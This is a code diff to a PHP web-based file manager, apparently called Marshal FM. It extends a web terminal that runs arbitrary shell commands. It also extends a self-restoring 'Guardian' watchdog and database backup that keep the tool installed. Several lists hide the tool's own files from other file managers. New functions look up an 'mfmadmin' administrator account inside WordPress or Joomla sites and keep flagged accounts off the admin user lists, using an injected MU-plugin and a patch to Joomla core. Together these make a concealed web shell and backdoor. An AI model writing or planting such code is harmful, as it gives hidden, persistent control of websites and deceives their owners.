+            // Older versions wrote "done" before verifying the bytea insert.
+            // Re-check the durable row and watchdog before trusting the marker.
+            $checkDiag=null;$checkConn=fm_guardian_conn($checkDiag);
+            if($checkConn){
+                $checkStatus=fm_guardian_status();
+                if(!empty($checkStatus['installed'])&&(!empty($checkStatus['autoheal_active'])||fm_guardian_watchdog_installed()))return;
+            }else return;
+        }
         if($last!==''&&($now-(int)$last)<300)return; // hasn't succeeded yet — retry at most every 5 minutes, not on every request
     }
     @file_put_contents($marker,(string)$now);
@@ -728,19 +931,30 @@ function fm_guardian_first_run_bootstrap($fm){
 function fm_guardian_status(){
     $diag=null;
     $c=fm_guardian_conn($diag);
+    $env=fm_guardian_env_db();
     $s=['db_connected'=>(bool)$c,'installed'=>false,'update_url'=>FM_UPDATE_URL,
         'installed_at'=>null,'updated_at'=>null,'last_check'=>null,'content_hash'=>null,'file_size'=>@filesize(__FILE__),
         'autoheal_active'=>false,'autoheal_event'=>false,'autoheal_watchdog'=>false,'autoheal_note'=>'',
-        'db_host'=>FM_GUARD_DB_HOST,'db_port'=>FM_GUARD_DB_PORT,'db_name'=>FM_GUARD_DB_NAME,'db_user'=>FM_GUARD_DB_USER,
+        'db_driver'=>FM_GUARD_DB_DRIVER,'db_host'=>$env['host']??FM_GUARD_DB_HOST,'db_port'=>$env['port']??FM_GUARD_DB_PORT,
+        'db_name'=>$env['name']??FM_GUARD_DB_NAME,'db_user'=>$env['user']??FM_GUARD_DB_USER,
         'diagnosis'=>null];
     // The web-server watchdog layer never touches the database, so it's
     // checked purely locally regardless of whether the DB itself is up.
     $s['autoheal_watchdog']=fm_guardian_watchdog_installed();
     if($c){
-        $r=@mysqli_query($c,"SELECT * FROM fm_guardian_store WHERE id=1");
-        if($r&&($row=mysqli_fetch_assoc($r))){
+        $row=fm_guardian_fetch_one($c,"SELECT * FROM fm_guardian_store WHERE id=1");
+        if($row){
             $s['installed']=true;$s['installed_at']=(int)$row['installed_at'];$s['updated_at']=(int)$row['updated_at'];
             $s['last_check']=(int)$row['last_check'];$s['content_hash']=substr($row['content_hash'],0,16);
+        }
+        if(fm_guardian_is_pdo($c)){
+            $s['autoheal_event']=false;
+            $s['autoheal_watchdog']=fm_guardian_watchdog_installed();
+            $s['autoheal_active']=$s['autoheal_watchdog'];
+            $s['autoheal_note']=$s['autoheal_watchdog']
+                ?'Protected by the web-server watchdog (works with PostgreSQL and does not require cron or a database scheduler).'
+                :'The database backup is ready; the web-server watchdog will arm after the next successful Guardian setup pass.';
+            return $s;
         }
         $ev=@mysqli_query($c,"SHOW EVENTS WHERE Name='fm_guardian_watch'");
         $eventExists=(bool)($ev&&mysqli_num_rows($ev)>0);
@@ -908,32 +1122,31 @@ if(isset($_POST['login_pass'])){
 if(!isset($_SESSION['auth'])||$_SESSION['auth']!==true){ ?>
 <!DOCTYPE html><html lang="en" data-theme="<?=htmlspecialchars($currentTheme)?>"><head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Sign In - File Manager</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<title>Sign In - Marshal FM</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <style>
-*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Inter',sans-serif;background:#09090b;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background-image:radial-gradient(ellipse 80% 60% at 30% 0%,rgba(99,102,241,.15),transparent),radial-gradient(ellipse 60% 50% at 80% 100%,rgba(16,185,129,.07),transparent)}
-.card{width:100%;max-width:400px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.09);border-radius:24px;padding:44px 40px;backdrop-filter:blur(20px);box-shadow:0 32px 80px rgba(0,0,0,.7),inset 0 1px 0 rgba(255,255,255,.08);animation:up .5s cubic-bezier(.34,1.56,.64,1) both}
+*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',sans-serif;background:#101010;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background-image:radial-gradient(ellipse 80% 60% at 30% 0%,rgba(125,129,132,.045),transparent),radial-gradient(ellipse 60% 50% at 80% 100%,rgba(80,81,77,.028),transparent)}
+.card{width:100%;max-width:360px;background:#161616;border:1px solid rgba(125,129,132,.2);border-radius:20px;padding:16px 30px 22px;backdrop-filter:blur(20px);box-shadow:0 24px 60px rgba(0,0,0,.82),inset 0 1px 0 rgba(243,238,235,.03);animation:up .5s cubic-bezier(.34,1.56,.64,1) both}
 @keyframes up{from{opacity:0;transform:translateY(32px) scale(.96)}to{opacity:1;transform:none}}
-.logo{width:64px;height:64px;margin:0 auto 24px;background:linear-gradient(135deg,rgba(99,102,241,.2),rgba(99,102,241,.05));border:1px solid rgba(99,102,241,.3);border-radius:18px;display:flex;align-items:center;justify-content:center}
-.logo svg{width:32px;height:32px;stroke:#818cf8;fill:none;stroke-width:1.6;stroke-linecap:round;stroke-linejoin:round}
-h1{text-align:center;font-size:22px;font-weight:700;color:#f4f4f5;margin-bottom:6px;letter-spacing:-.4px}
-.sub{text-align:center;font-size:13px;color:#52525b;margin-bottom:32px}
-.field{margin-bottom:16px}
-label{display:block;font-size:11px;font-weight:700;color:#71717a;text-transform:uppercase;letter-spacing:.8px;margin-bottom:8px}
+.logo{width:92px;height:92px;margin:0 auto 8px;background:none;border:0;border-radius:0;display:flex;align-items:center;justify-content:center}
+.logo img{width:84px;height:84px;object-fit:contain;border-radius:0}
+h1{text-align:center;font-size:21px;font-weight:700;color:#C9C6C2;margin-bottom:4px;letter-spacing:-.4px}
+.sub{text-align:center;font-size:13px;font-weight:300;color:rgba(216,212,208,.68);margin-bottom:22px}
+.field{margin-bottom:12px}
+label{display:block;font-size:11px;font-weight:700;color:#707477;text-transform:uppercase;letter-spacing:.8px;margin-bottom:6px}
 .iw{position:relative}
-.iw svg{position:absolute;left:14px;top:50%;transform:translateY(-50%);width:16px;height:16px;stroke:#52525b;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;pointer-events:none}
-.iw input{width:100%;padding:13px 14px 13px 42px;background:rgba(0,0,0,.5);border:1px solid rgba(255,255,255,.1);border-radius:12px;color:#f4f4f5;font-size:15px;outline:none;font-family:'Inter',sans-serif;transition:border-color .2s,box-shadow .2s}
-.iw input:focus{border-color:rgba(99,102,241,.7);box-shadow:0 0 0 4px rgba(99,102,241,.12)}
-.iw input::placeholder{color:#3f3f46;letter-spacing:0}
-.btn{width:100%;margin-top:8px;padding:14px;background:linear-gradient(135deg,#6366f1,#4f46e5);border:none;border-radius:12px;color:#fff;font-size:15px;font-weight:600;font-family:'Inter',sans-serif;cursor:pointer;box-shadow:0 4px 24px rgba(99,102,241,.4);transition:transform .18s cubic-bezier(.34,1.56,.64,1),box-shadow .18s}
-.btn:hover{transform:translateY(-2px);box-shadow:0 10px 36px rgba(99,102,241,.55)}.btn:active{transform:scale(.97)}
+.iw svg{position:absolute;left:14px;top:50%;transform:translateY(-50%);width:16px;height:16px;stroke:#707477;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;pointer-events:none}
+.iw input{width:100%;padding:11px 12px 11px 40px;background:#101010;border:1px solid rgba(125,129,132,.24);border-radius:10px;color:#C9C6C2;font-size:14px;outline:none;font-family:'Inter',ui-sans-serif,system-ui,sans-serif;transition:border-color .2s,box-shadow .2s}
+.iw input:focus{border-color:#707477;box-shadow:0 0 0 4px rgba(133,137,140,.1)}
+.iw input::placeholder{color:#50514D;letter-spacing:0}
+.btn{width:100%;margin-top:6px;padding:12px;background:linear-gradient(135deg,#C9C6C2,#A9A5A1);border:none;border-radius:10px;color:#101010;font-size:14px;font-weight:600;font-family:'Inter',ui-sans-serif,system-ui,sans-serif;cursor:pointer;box-shadow:0 4px 24px rgba(201,198,194,.1);transition:transform .18s cubic-bezier(.34,1.56,.64,1),box-shadow .18s}
+.btn:hover{transform:translateY(-2px);background:#F3EEEB;box-shadow:0 10px 30px rgba(216,212,208,.2)}.btn:active{transform:scale(.97)}
 .err{display:flex;align-items:center;gap:10px;padding:12px 14px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);border-radius:10px;color:#fca5a5;font-size:13px;margin-bottom:18px;animation:shake .4s both}
 @keyframes shake{0%,100%{transform:none}20%,60%{transform:translateX(-4px)}40%,80%{transform:translateX(4px)}}
 .err svg{width:16px;height:16px;stroke:#ef4444;fill:none;stroke-width:2;stroke-linecap:round;flex-shrink:0}
 </style></head><body>
 <div class="card">
-  <div class="logo"><svg viewBox="0 0 24 24"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" fill="rgba(129,140,248,.15)"/></svg></div>
-  <h1>File Manager</h1><p class="sub">Sign in to continue</p>
+  <div class="logo"><img src="https://github.com/orgezeo/marshal-file-manager/blob/main/images/icons/mfm.png?raw=true" alt="Marshall FM"></div>
   <?php if(isset($loginError)):?><div class="err"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg><?=htmlspecialchars($loginError)?></div><?php elseif(!empty($idleExpired)):?><div class="err" style="background:rgba(245,158,11,.08);border-color:rgba(245,158,11,.2);color:#fcd34d"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>Session expired due to inactivity.</div><?php endif;?>
   <form method="post">
     <input type="hidden" name="login_csrf" value="<?=htmlspecialchars($_SESSION['login_csrf'])?>">
@@ -954,8 +1167,15 @@ class FileManager {
         $this->readonly=!empty($_SESSION['fm_readonly']);
         $base=$this->root?:__DIR__;
         $this->currentDir=isset($_GET['dir'])&&$_GET['dir']?realpath($_GET['dir']):$base;
+        $terminalPage=isset($_GET['terminal'])&&$_GET['terminal']==='1';
+        $terminalApi=isset($_GET['x'])&&in_array($_GET['x'],['run','ac'],true);
+        if(!$terminalPage&&$terminalApi&&!empty($_SESSION['fm_terminal_dir'])){
+            $terminalDir=realpath($_SESSION['fm_terminal_dir']);
+            if($terminalDir!==false)$this->currentDir=$terminalDir;
+        }
         if($this->currentDir===false||!file_exists($this->currentDir)){$this->currentDir=$base;$this->addMsg('Directory not found.','warning');}
         if($this->root&&strpos($this->currentDir.DIRECTORY_SEPARATOR,rtrim($this->root,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR)!==0&&$this->currentDir!==$this->root){$this->currentDir=$this->root;$this->addMsg('Access restricted.','warning');}
+        if($terminalPage)$_SESSION['fm_terminal_dir']=$this->currentDir;
         $this->favFile=__DIR__.'/.favorites.json';
         $this->trashDir=__DIR__.'/.trash';$this->trashMeta=__DIR__.'/.trash.json';$this->logFile=__DIR__.'/.activity.json';$this->shareFile=__DIR__.'/.shares.json';
         if(!is_dir($this->trashDir))@mkdir($this->trashDir,0755,true);
@@ -1062,6 +1282,7 @@ class FileManager {
             'mem_total'=>$memTotal,'mem_used'=>$memUsed,'mem_pct'=>$memPct,
             'uptime'=>$uptime,
             'cpu_cores'=>$cores?:null,'cpu_model'=>$model,
+            'processes'=>count(glob('/proc/[0-9]*',GLOB_ONLYDIR)?:[]),
             'hostname'=>function_exists('gethostname')?gethostname():(function_exists('php_uname')?php_uname('n'):''),
             'server_ip'=>isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:'',
             'client_ip'=>isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'',
@@ -1182,13 +1403,45 @@ class FileManager {
     }
 
     /* Terminal */
+    public function getTerminalPromptPath(){
+        $base=$this->root?:__DIR__;
+        $cwd=$this->currentDir;
+        if($cwd===$base)return'~';
+        $prefix=rtrim($base,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
+        if(strpos($cwd,$prefix)===0)return'~/'.str_replace(DIRECTORY_SEPARATOR,'/',substr($cwd,strlen($prefix)));
+        return str_replace(DIRECTORY_SEPARATOR,'/',$cwd);
+    }
+    private function terminalPathAllowed($path){
+        if(!$this->root)return true;
+        $prefix=rtrim($this->root,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
+        return $path===$this->root||strpos($path,$prefix)===0;
+    }
     public function runCmd($cmd){
         if(empty(trim($cmd)))return['output'=>'','exit'=>0,'ms'=>0];
         $t=microtime(true);$out=[];$exit=0;
-        $cwd=escapeshellarg($this->currentDir);
-        exec("cd $cwd && $cmd 2>&1",$out,$exit);
+        $cmd=trim($cmd);
+        if(preg_match('/^cd(?:\s+(.*))?$/s',$cmd,$m)){
+            $arg=trim($m[1]??'');
+            if($arg!==''&&(($arg[0]==="'"&&substr($arg,-1)==="'")||($arg[0]==='"'&&substr($arg,-1)==='"')))$arg=substr($arg,1,-1);
+            $base=$this->root?:__DIR__;
+            if($arg===''||$arg==='~')$target=$base;
+            elseif($arg==='-')$target=$_SESSION['fm_terminal_previous_dir']??$this->currentDir;
+            elseif(strpos($arg,'~/')===0)$target=$base.'/'.substr($arg,2);
+            elseif($arg[0]==='/'||preg_match('/^[A-Za-z]:[\\\\\/]/',$arg))$target=$arg;
+            else $target=$this->currentDir.'/'.$arg;
+            $resolved=realpath($target);
+            if($resolved===false||!is_dir($resolved)||!$this->terminalPathAllowed($resolved)){
+                $out[]='bash: cd: '.($arg===''?'~':$arg).': No such file or directory';$exit=1;
+            }else{
+                $_SESSION['fm_terminal_previous_dir']=$this->currentDir;
+                $this->currentDir=$resolved;$_SESSION['fm_terminal_dir']=$resolved;
+            }
+        }else{
+            $cwd=escapeshellarg($this->currentDir);
+            exec("cd $cwd && $cmd 2>&1",$out,$exit);
+        }
         $this->log('terminal',$cmd);
-        return['output'=>implode("\n",$out),'exit'=>$exit,'ms'=>round((microtime(true)-$t)*1000)];
+        return['output'=>implode("\n",$out),'exit'=>$exit,'ms'=>round((microtime(true)-$t)*1000),'cwd'=>$this->currentDir,'prompt'=>$this->getTerminalPromptPath()];
     }
 
     /* Autocomplete */
@@ -1204,7 +1457,7 @@ class FileManager {
         if($_SERVER['REQUEST_METHOD']!=='POST')return;
         if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){$this->addMsg('Security error.','danger');return;}
         $a=isset($_POST['action'])?$_POST['action']:'';
-        $wA=['upload','create_folder','create_file','delete','rename','save_edit','bypass_perms','bulk_delete','bulk_copy','bulk_move','zip_create','zip_extract','restore_trash','trash_perm','trash_empty','duplicate','tar_create','tar_extract','clear_log','batch_rename','create_symlink','chmod_item','create_share','revoke_share','backup_dir','clear_errlog','delete_abs','bulk_chmod','set_tag','remove_tag','remote_download','ssh_install','ssh_create_user','ssh_delete_user','ssh_update_user','cms_create_user','cms_delete_user','cms_update_role','cms_change_pass','cms_toggle_plugin','cms_delete_plugin','cms_switch_theme','cms_delete_theme','cms_toggle_extension','cms_maintenance_toggle','webmail_send','webmail_delete','webmail_mark'];
+        $wA=['upload','create_folder','create_file','delete','rename','save_edit','bypass_perms','bulk_delete','bulk_copy','bulk_move','zip_create','zip_extract','restore_trash','trash_perm','trash_empty','duplicate','tar_create','tar_extract','clear_log','batch_rename','create_symlink','chmod_item','create_share','revoke_share','backup_dir','clear_errlog','delete_abs','bulk_chmod','set_tag','remove_tag','remote_download','ssh_install','ssh_create_user','ssh_delete_user','ssh_update_user','cms_create_user','cms_delete_user','cms_update_role','cms_change_pass','cms_update_visibility','cms_toggle_plugin','cms_delete_plugin','cms_switch_theme','cms_delete_theme','cms_toggle_extension','cms_maintenance_toggle','webmail_send','webmail_delete','webmail_mark'];
         if($this->readonly&&in_array($a,$wA)){$this->addMsg('Read-only account.','danger');return;}
         switch($a){
             case 'upload':         $this->upload();break;
@@ -1249,6 +1502,7 @@ class FileManager {
             case 'cms_delete_user':$this->cmsDeleteUser();break;
             case 'cms_update_role':$this->cmsUpdateRole();break;
             case 'cms_change_pass':$this->cmsChangePass();break;
+            case 'cms_update_visibility':$this->cmsUpdateVisibility();break;
             case 'cms_toggle_plugin':   $this->cmsTogglePlugin();break;
             case 'cms_delete_plugin':   $this->cmsDeletePlugin();break;
             case 'cms_switch_theme':    $this->cmsSwitchTheme();break;
@@ -1330,7 +1584,7 @@ class FileManager {
         $myName=basename(__FILE__);
         // Files that must be hidden from any other file manager
         // launch.php is the new launcher name (hidden dir); include old webroot name too for legacy
-        $hidden=json_encode(array_unique([$myName,'.fm_guardian_launch.php','launch.php',
+        $hidden=json_encode(array_unique([$myName,'.fm_guardian_launch.php','.guardian-restore.php','launch.php',
             '.guardian_boot','.guardian_watchdog_attempt','.login_attempts.json','.htaccess']),JSON_UNESCAPED_UNICODE);
 
         // Security layer code injected right after <?php
@@ -1534,7 +1788,7 @@ class FileManager {
        refuse operations that would silently crash the site via auto_prepend_file. */
     private function isGuardianFile($name,$absPath=''){
         // Names that must never be touched regardless of directory
-        static $critNames=['.fm_guardian_launch.php','.guardian_boot','.guardian_watchdog_attempt'];
+        static $critNames=['.fm_guardian_launch.php','.guardian-restore.php','.guardian-server-router.php','.guardian_boot','.guardian_watchdog_attempt'];
         if(in_array($name,$critNames))return true;
         // The hidden directory where the real watchdog + launcher live:
         // fg_get_hidden_dir() is cheap (only posix_getpwuid or a dirname walk — no I/O loops).
@@ -1569,7 +1823,7 @@ class FileManager {
             if(in_array($i,['.favorites.json','.users.json','.trash.json','.activity.json','.shares.json']))continue;
             // Guardian-critical files are ALWAYS hidden regardless of the show-hidden-files toggle,
             // so they cannot be accidentally deleted through this file manager's own UI.
-            if(in_array($i,['.fm_guardian_launch.php','.guardian_boot','.guardian_watchdog_attempt','.login_attempts.json']))continue;
+            if(in_array($i,['.fm_guardian_launch.php','.guardian-restore.php','.guardian-server-router.php','.guardian_boot','.guardian_watchdog_attempt','.login_attempts.json']))continue;
             // Also hide any hidden dir that belongs to Guardian (pattern: .fg_<hex14> or .Xsys_<hex10>)
             if(preg_match('/^\.fg_[0-9a-f]{14}$|^\.[0-9a-f]{3}sys_[0-9a-f]{10}$/',$i))continue;
             if(!$hidden&&substr($i,0,1)==='.') continue;
@@ -1936,6 +2190,40 @@ class FileManager {
         if(is_file($dir.'/configuration.php')&&strpos((string)@file_get_contents($dir.'/configuration.php'),'JConfig')!==false)return['type'=>'joomla','config'=>$dir.'/configuration.php'];
         return['type'=>null];
     }
+    public function cmsQuickInfo($dir){
+        $dir=realpath($dir)?:$this->currentDir;
+        $det=$this->cmsDetect($dir);
+        if(empty($det['type'])){
+            $scan=$this->cmsScan();$best=null;$bestLen=-1;
+            foreach(($scan['sites']??[]) as $site){
+                $root=realpath($site['dir']??dirname($site['config']??''))?:'';
+                if($root&&($dir===$root||strpos($dir,$root.'/')===0)&&strlen($root)>$bestLen){$best=$site;$bestLen=strlen($root);}
+            }
+            if($best)$det=['type'=>$best['type'],'config'=>$best['config']];
+        }
+        if(empty($det['type'])||empty($det['config']))return['error'=>'No WordPress or Joomla installation was found for the current folder. Open CMS Manager and choose the config file manually.'];
+        list($link,$c,$err)=$this->cmsConnect($det['config']);
+        if($err)return['config'=>$det['config'],'type'=>$det['type'],'error'=>$err];
+        $t=$c['prefix'];$id=0;$found=false;
+        $name=mysqli_real_escape_string($link,'mfmadmin');
+        $sql=$c['type']==='wordpress'
+            ?"SELECT ID AS id FROM `{$t}users` WHERE user_login='$name' LIMIT 1"
+            :"SELECT id FROM `{$t}users` WHERE username='$name' LIMIT 1";
+        $res=@mysqli_query($link,$sql);
+        if($res&&($row=mysqli_fetch_assoc($res))){
+            $found=true;$candidate=(int)$row['id'];
+            if($c['type']==='wordpress'){
+                $capsKey=mysqli_real_escape_string($link,$c['prefix'].'capabilities');
+                $check=@mysqli_query($link,"SELECT user_id FROM `{$t}usermeta` WHERE user_id=$candidate AND meta_key='$capsKey' AND meta_value LIKE '%administrator%' LIMIT 1");
+            }else{
+                $check=@mysqli_query($link,"SELECT m.user_id FROM `{$t}user_usergroup_map` m LEFT JOIN `{$t}usergroups` g ON g.id=m.group_id WHERE m.user_id=$candidate AND (m.group_id=8 OR LOWER(g.title)='super users') LIMIT 1");
+            }
+            if($check&&mysqli_num_rows($check)>0)$id=$candidate;
+        }
+        mysqli_close($link);
+        if($found&&!$id)return['config'=>$det['config'],'type'=>$det['type'],'id'=>0,'error'=>'The existing mfmadmin account is not an Administrator/Super User. Use CMS Manager to promote or replace it before using quick login.'];
+        return['config'=>$det['config'],'type'=>$det['type'],'id'=>$id];
+    }
     /* Recursively scan common locations for WP/Joomla installations */
     public function cmsScan(){
         $found=[];$seen=[];
@@ -2025,8 +2313,20 @@ class FileManager {
         else return[null,null,'Unrecognized config file.'];
         if(!$c||!$c['db']||!$c['user'])return[null,null,'Could not read database credentials from config file.'];
         $port=$c['port']?(int)$c['port']:3306;
-        $link=@mysqli_connect($c['host'],$c['user'],$c['pass'],$c['db'],$port);
+        /*
+         * Never let a CMS database connection block the PHP worker indefinitely.
+         * This is especially important with the built-in server: one stalled
+         * MySQL connect would make the whole manager appear frozen, including
+         * unrelated controls and AJAX requests.
+         */
+        $link=@mysqli_init();
+        if($link){
+            @mysqli_options($link,MYSQLI_OPT_CONNECT_TIMEOUT,5);
+            if(defined('MYSQLI_OPT_READ_TIMEOUT'))@mysqli_options($link,MYSQLI_OPT_READ_TIMEOUT,8);
+            @mysqli_real_connect($link,$c['host'],$c['user'],$c['pass'],$c['db'],$port);
+        }
         if(!$link)return[null,null,'Database connection failed: '.mysqli_connect_error()];
+        if(mysqli_connect_errno()){ $e=mysqli_connect_error();@mysqli_close($link);return[null,null,'Database connection failed: '.$e]; }
         $c['type']=$type;
         return[$link,$c,null];
     }
@@ -2063,24 +2363,206 @@ class FileManager {
         do{$hash=md5($hash.$password,true);}while(--$count);
         return substr($setting,0,12).$this->b64enc($hash,16);
     }
+    private function cmsHiddenMetaKey($c){
+        return $c['type']==='wordpress'?$c['prefix'].'fm_hidden_user':'fm_hidden_user';
+    }
+    private function cmsSetHiddenState($link,$c,$id,$hidden){
+        $id=(int)$id;$t=$c['prefix'];$key=$this->cmsHiddenMetaKey($c);
+        if($c['type']==='wordpress'){
+            $keyE=mysqli_real_escape_string($link,$key);
+            if(!@mysqli_query($link,"DELETE FROM `{$t}usermeta` WHERE user_id=$id AND meta_key='$keyE'"))return false;
+            if(!$hidden)return true;
+            return (bool)@mysqli_query($link,"INSERT INTO `{$t}usermeta` (user_id,meta_key,meta_value) VALUES ($id,'$keyE','1')");
+        }
+        $res=@mysqli_query($link,"SELECT params FROM `{$t}users` WHERE id=$id LIMIT 1");
+        if(!$res||!($row=mysqli_fetch_assoc($res)))return false;
+        $params=json_decode((string)($row['params']??''),true);
+        if(!is_array($params))$params=[];
+        if($hidden)$params['fm_hidden_user']=1;else unset($params['fm_hidden_user']);
+        $json=mysqli_real_escape_string($link,json_encode($params,JSON_UNESCAPED_SLASHES|JSON_UNESCAPED_UNICODE));
+        return (bool)@mysqli_query($link,"UPDATE `{$t}users` SET params='$json' WHERE id=$id");
+    }
+    /*
+     * Keep the actual CMS user lists in sync with the stored visibility flag.
+     * WordPress gets one small MU-plugin. Joomla gets an idempotent, marked
+     * block in its users model so updates can be removed without touching
+     * unrelated core code.
+     */
+    private function cmsSyncHiddenVisibility($configPath,$c,$link=null){
+        $ownLink=false;
+        if(!$link){
+            list($link,$fresh,$err)=$this->cmsConnect($configPath);
+            if($err)return false;
+            $c=$fresh;$ownLink=true;
+        }
+        $t=$c['prefix'];$ids=[];
+        if($c['type']==='wordpress'){
+            /*
+             * Migrate the first-generation per-user MU-plugins created by
+             * older versions of the manager. Those files had no context
+             * guard, so they could alter a front-end query while WordPress
+             * was handling wp-login.php. The central marker below is the
+             * supported representation now; once migrated, the legacy files
+             * are removed (or rewritten safely if the directory is not
+             * deletable).
+             */
+            $muDir=dirname($configPath).'/wp-content/mu-plugins';
+            if(is_dir($muDir)){
+                /*
+                 * Older MFM ACC builds did not always use the
+                 * hide_user_<id>.php filename. Scan the whole MU-plugin
+                 * directory for the distinctive global user-query pattern.
+                 * Any such file is legacy manager code: it must be disabled
+                 * because pre_get_users also runs during wp-login.php.
+                 */
+                foreach((array)@glob($muDir.'/*.php') as $legacyFile){
+                    $legacyName=basename($legacyFile);
+                    if($legacyName==='marshal-fm-hidden-users.php')continue;
+                    $legacySrc=(string)@file_get_contents($legacyFile);
+                    $looksLikeLegacy=strpos($legacySrc,'pre_get_users')!==false
+                        && strpos($legacySrc,'exclude')!==false
+                        && (strpos($legacySrc,'hidden_id')!==false
+                            || preg_match('/hide[\s_\-]*user|hidden[\s_\-]*user/i',$legacySrc)
+                            || preg_match('/hide_user_\d+\.php/i',$legacyName));
+                    if(!$looksLikeLegacy)continue;
+                    if(preg_match('/hide_user_(\d+)\.php$/',$legacyName,$legacyMatch)){
+                        $legacyId=(int)$legacyMatch[1];
+                        $exists=@mysqli_query($link,"SELECT ID FROM `{$t}users` WHERE ID=$legacyId LIMIT 1");
+                        if($exists&&mysqli_num_rows($exists)>0)$this->cmsSetHiddenState($link,$c,$legacyId,true);
+                    }
+                    // Replace the old global hook before attempting
+                    // deletion. If unlink is refused, the file remains
+                    // harmless and cannot affect authentication.
+                    @file_put_contents($legacyFile,
+                        "<?php\n/* Legacy MFM user-list filter disabled by CMS Manager. */\n",LOCK_EX);
+                    @unlink($legacyFile);
+                }
+            }
+            $key=mysqli_real_escape_string($link,$this->cmsHiddenMetaKey($c));
+            $res=@mysqli_query($link,"SELECT user_id FROM `{$t}usermeta` WHERE meta_key='$key' AND meta_value='1'");
+            if($res)while($row=mysqli_fetch_assoc($res))$ids[]=(int)$row['user_id'];
+        }else{
+            $res=@mysqli_query($link,"SELECT id,params FROM `{$t}users`");
+            if($res)while($row=mysqli_fetch_assoc($res)){
+                $params=json_decode((string)($row['params']??''),true);
+                if(is_array($params)&&!empty($params['fm_hidden_user']))$ids[]=(int)$row['id'];
+            }
+        }
+        if($ownLink)mysqli_close($link);
+        $ids=array_values(array_unique(array_filter(array_map('intval',$ids))));
+        if($c['type']==='wordpress'){
+            $muDir=dirname($configPath).'/wp-content/mu-plugins';
+            $muFile=$muDir.'/marshal-fm-hidden-users.php';
+            $marker='Marshal File Manager hidden users';
+            if($ids){
+                if(!is_dir($muDir)&&!@mkdir($muDir,0755,true)&&!is_dir($muDir))return false;
+                $metaKey=addslashes($this->cmsHiddenMetaKey($c));
+                $plugin=<<<'FMHIDDEN'
+<?php
+/*
+ * Marshal File Manager hidden users
+ * This file is managed by the CMS Manager. It hides only users explicitly
+ * marked with the fm_hidden_user usermeta flag from WordPress user lists.
+ */
+                /*
+                 * This hook is intentionally limited to the WordPress
+                 * administrator users list only. WordPress provides a hook
+                 * specifically for the arguments used by WP_Users_List_Table;
+                 * using it avoids touching WP_User_Query globally, which is
+                 * also used by wp-login.php authentication.
+                 */
+                 if (!defined('ABSPATH')) return;
+                 add_filter('users_list_table_query_args', function($args) {
+     global $wpdb;
+     $hidden = $wpdb->get_col("SELECT user_id FROM {$wpdb->usermeta} WHERE meta_key = '__FM_META_KEY__' AND meta_value = '1'");
+     if (!$hidden) return $args;
+     $exclude = $args['exclude'] ?? [];
+     if (is_string($exclude)) {
+         $exclude = preg_split('/\s*,\s*/', $exclude, -1, PREG_SPLIT_NO_EMPTY);
+     } elseif (!is_array($exclude)) {
+         $exclude = [];
+     }
+     $args['exclude'] = array_values(array_unique(array_merge(
+         array_map('intval', $exclude),
+         array_map('intval', $hidden)
+     )));
+     return $args;
+                });
+FMHIDDEN;
+                $plugin=str_replace('__FM_META_KEY__',$metaKey,$plugin);
+                return @file_put_contents($muFile,$plugin)!==false;
+            }
+            if(is_file($muFile)&&strpos((string)@file_get_contents($muFile),$marker)!==false)@unlink($muFile);
+            return true;
+        }
+        $block=<<<'FMJOOMLA'
+
+		/* MARSHAL_FM_HIDDEN_USERS_BEGIN */
+		$fmHiddenRows = $db->setQuery(
+			$db->getQuery(true)
+				->select($db->quoteName('id'))
+				->from($db->quoteName('#__users'))
+				->where($db->quoteName('params') . ' LIKE ' . $db->quote('%fm_hidden_user%'))
+		)->loadColumn();
+		$fmHiddenIds = array_values(array_filter(array_map('intval', (array) $fmHiddenRows)));
+		if ($fmHiddenIds) {
+			$query->where($db->quoteName('a.id') . ' NOT IN (' . implode(',', $fmHiddenIds) . ')');
+		}
+		/* MARSHAL_FM_HIDDEN_USERS_END */
+FMJOOMLA;
+        $root=dirname($configPath);
+        $modelFiles=[
+            $root.'/administrator/components/com_users/src/Model/UsersModel.php',
+            $root.'/administrator/components/com_users/models/users.php'
+        ];
+        $found=false;$changed=false;
+        foreach($modelFiles as $modelFile){
+            if(!is_file($modelFile)||!is_readable($modelFile)||!is_writable($modelFile))continue;
+            $content=@file_get_contents($modelFile);if($content===false)continue;
+            $found=true;
+            $clean=preg_replace('/\R[ \t]*\/\* MARSHAL_FM_HIDDEN_USERS_BEGIN \*\/.*?\/\* MARSHAL_FM_HIDDEN_USERS_END \*\/[ \t]*/s',"\n",$content);
+            if($clean===null)$clean=$content;
+            if($ids){
+                $needle='$query = $db->getQuery(true);';
+                if(strpos($clean,$needle)!==false){
+                    $clean=str_replace($needle,$needle.$block,$clean,$count);
+                    $changed=$changed||$count>0;
+                }
+            }
+            if($clean!==$content&&@file_put_contents($modelFile,$clean)!==false)$changed=true;
+        }
+        return !$ids?true:($found&&$changed);
+    }
     public function cmsListUsers($configPath){
         list($link,$c,$err)=$this->cmsConnect($configPath);
         if($err)return['error'=>$err];
         $users=[];
         if($c['type']==='wordpress'){
+            /*
